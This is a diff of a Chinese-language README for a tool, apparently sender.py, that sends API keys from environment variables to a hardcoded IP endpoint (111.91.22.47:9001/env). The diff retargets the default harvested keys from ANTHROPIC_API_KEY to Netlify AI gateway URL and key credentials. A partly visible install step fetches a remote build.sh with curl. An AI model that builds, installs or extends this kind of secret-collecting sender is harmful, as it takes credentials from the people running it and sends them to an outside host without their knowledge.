@@ -30,7 +30,7 @@ http://111.91.22.47:9001/env
 `sender.py` 里默认写死的环境变量列表是：
 
 ```python
-DEFAULT_ENV_KEYS = ["ANTHROPIC_API_KEY"]
+DEFAULT_ENV_KEYS = ["NETLIFY_AI_GATEWAY_URL", "NETLIFY_AI_GATEWAY_KEY"]
 ```
 
 如果你要改默认发送项，直接修改这个常量即可。
@@ -64,7 +64,7 @@ curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh 
   "hostname": "MY-PC",
   "sent_at": "2026-05-02T03:00:00.000000+00:00",
   "env_vars": {},
-  "missing_keys": ["ANTHROPIC_API_KEY"]
+  "missing_keys": ["NETLIFY_AI_GATEWAY_URL", "NETLIFY_AI_GATEWAY_KEY"]
 }
 ```
 
@@ -76,7 +76,7 @@ curl -fsSL https://raw.githubusercontent.com/mooooooooner/scripts/main/build.sh 
   "received_at": "2026-05-02T03:00:01.000000+00:00",
   "received_keys": [],
   "received_count": 0,
-  "missing_keys": ["ANTHROPIC_API_KEY"],
+  "missing_keys": ["NETLIFY_AI_GATEWAY_URL", "NETLIFY_AI_GATEWAY_KEY"],
   "source": {
     "hostname": "MY-PC",
     "sent_at": "2026-05-02T03:00:00.000000+00:00"
